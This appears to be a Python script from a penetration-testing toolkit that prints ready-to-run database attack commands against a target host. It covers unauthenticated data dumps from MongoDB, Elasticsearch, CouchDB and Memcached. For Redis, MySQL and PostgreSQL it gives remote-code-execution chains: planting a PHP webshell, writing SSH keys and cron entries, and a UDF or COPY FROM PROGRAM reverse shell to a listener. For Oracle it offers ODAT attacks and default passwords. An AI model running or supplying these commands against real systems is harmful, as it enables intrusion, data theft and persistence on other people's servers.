#!/usr/bin/env python3
"""DATABASE foothold — unauthenticated access + direct RCE (no web app in front). PRINTS commands.

Usage:
  python3 gen_db.py --db mongo|elastic|couchdb|memcached|redis|mysql|postgres|oracle --target 10.0.0.5 [--user u --pass p]
"""
import sys
import _services_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

db  = opt("--db", "redis")
t   = opt("--target", "<target>")
u   = opt("--user", "root")
pw  = opt("--pass", "")
rev = P.revshell("bash")

print(f"# DATABASE foothold  db={db}  target={t}\n")
if db == "mongo":
    print(f"# MongoDB (27017) — often NO auth. Read data/creds (no native RCE):")
    print(f"# needs: MongoDB reachable + auth disabled (or found creds).")
    print(f"mongosh 'mongodb://{t}:27017'    # or: mongo {t}")
    print(f"#   -> ok: you reach the shell prompt and `show dbs` lists databases = unauthenticated access")
    print(f"#   show dbs; use <db>; show collections; db.users.find(); db.getUsers()")
    print(f"nxc mongodb {t}                  # quick unauth check")
    print(f"# -> app creds/hashes in collections -> crack / reuse (../network/gen_shell).")
elif db == "elastic":
    print(f"# Elasticsearch (9200) — unauth REST:")
    print(f"# needs: Elasticsearch on 9200 with security disabled (no HTTP 401).")
    print(f"curl -s {t}:9200/_cat/indices?v ; curl -s {t}:9200/_search?pretty  | head")
    print(f"#   -> ok: the index table / JSON hits print (not '401 Unauthorized') = unauthenticated")
    print(f"# dump an index:  curl -s '{t}:9200/<index>/_search?size=1000&pretty'")
    print(f"# old versions RCE: CVE-2014-3120 / CVE-2015-1427 (Groovy sandbox) -> msf/searchsploit.")
elif db == "couchdb":
    print(f"# CouchDB (5984) — unauth:")
    print(f"# needs: CouchDB on 5984 in admin-party (no admin set) for the read; the CVE chain needs a vulnerable version.")
    print(f"curl -s {t}:5984/_all_dbs ; curl -s {t}:5984/_users/_all_docs")
    print(f"#   -> ok: a JSON array of db names prints (not '401') = unauthenticated")
    print(f"# CVE-2017-12635 add an admin (JSON dup-key), then CVE-2017-12636 RCE via query_server config:")
    print(f"# -> searchsploit couchdb  (chained add-admin + RCE PoC).")
elif db == "memcached":
    print(f"# Memcached (11211) — unauth, dumps sessions/creds:")
    print(f"# needs: Memcached on 11211 with no SASL auth.")
    print(f"memcstat --servers={t}; echo -e 'stats items' | nc {t} 11211")
    print(f"#   -> ok: 'STAT items:...' lines come back = unauthenticated and there is cached data")
    print(f"# dump keys:  for each slab -> 'stats cachedump <slab> 0' -> 'get <key>'  (session tokens, creds).")
elif db == "redis":
    print(f"# Redis (6379) — unauth -> RCE. Confirm:  redis-cli -h {t} ping  (PONG = open)")
    print(f"# needs: Redis on 6379 with no `requirepass` and NOT in protected-mode (else it replies NOAUTH/DENIED).")
    print(f"#   -> ok: `redis-cli -h {t} ping` returns PONG (not NOAUTH) = unauthenticated")
    print(f"# order: pick the write-primitive that fits the box — A webroot (needs known web root), else B SSH key (needs a writable ~/.ssh), else C cron (Debian/RedHat cron layout).")
    print(f"# A) webshell (know the web root):")
    print(f"redis-cli -h {t} config set dir /var/www/html; redis-cli -h {t} config set dbfilename s.php")
    print(f"redis-cli -h {t} set x '{P.WEBSHELL_PHP_NQ}'; redis-cli -h {t} save   # -> http://{t}/s.php?0=id")
    print(f"#   -> ok: `curl 'http://{t}/s.php?0=id'` returns the output of `id` = write + web-exec landed")
    print(f"# B) SSH key:  set dir ~/.ssh, dbfilename authorized_keys, set x '<your pubkey>', save -> ssh in.")
    print(f"# C) cron:  set dir /var/spool/cron, dbfilename root, a value = a crontab line.  D) module load (RogueSQL/msf).")
elif db == "mysql":
    print(f"# MySQL (3306) — with creds ({u}:{pw or '<pass>'}):  mysql -h {t} -u {u} -p'{pw}'")
    print(f"# needs: valid DB creds in <user>/<pass>; file/RCE steps additionally need the FILE privilege.")
    print(f"#   -> ok: you reach the `mysql>` prompt = the creds authenticate")
    print(f"# read files:  SELECT LOAD_FILE('/etc/passwd');")
    print(f"# write webshell:  SELECT '{P.WEBSHELL_PHP_NQ}' INTO OUTFILE '/var/www/html/s.php';  (needs FILE + writable dir; then ?0=id)")
    print(f"# RCE via UDF:  lib_mysqludf_sys -> write the .so to plugin_dir -> CREATE FUNCTION sys_exec -> sys_exec('{P.revshell_nq()}')")
    print(f"# no creds? spray:  ../network/gen_spray.py --proto mysql --target {t}")
elif db == "postgres":
    print(f"# PostgreSQL (5432) — with creds ({u}:{pw or '<pass>'}):  psql -h {t} -U {u}")
    print(f"# needs: valid creds in <user>/<pass>; COPY FROM PROGRAM needs a SUPERUSER role on PostgreSQL 9.3+.")
    print(f"#   -> ok: you reach the `<db>=#` prompt = the creds authenticate")
    print(f"# RCE (9.3+ superuser) COPY FROM PROGRAM:")
    print(f"DROP TABLE IF EXISTS x; CREATE TABLE x(o text); COPY x FROM PROGRAM '{P.revshell_nq()}';")
    print(f"#   -> ok: a connection lands on your listener = COPY FROM PROGRAM executed (you are superuser)")
    print(f"# read files:  COPY x FROM '/etc/passwd';   older: large-object -> lo_export a lib.")
elif db == "oracle":
    print(f"# Oracle TNS (1521) — enumerate SID + default creds with ODAT:")
    print(f"# needs: Oracle TNS listener on 1521; a valid <SID> (from sidguesser) + creds (from passwordguesser or defaults).")
    print(f"odat sidguesser -s {t}; odat passwordguesser -s {t} -d <SID>")
    print(f"#   -> ok: sidguesser prints a 'Valid SID' + passwordguesser prints 'Valid credentials' = you have <SID> + creds")
    print(f"odat all -s {t} -d <SID> -U {u} -P '{pw}'    # utlfile/dbmsadvisor/externaltable RCE + file r/w")
    print(f"# default creds: scott/tiger, system/manager, sys/change_on_install ...")
else:
    print(f"# unknown --db '{db}' (mongo|elastic|couchdb|memcached|redis|mysql|postgres|oracle)"); sys.exit(1)

print(f"\n# a shell -> upgrade to a PTY, then ../../winpriv/enum.bat or ../../linpriv/enum.sh.   catch: nc -lvnp {P.LPORT}")
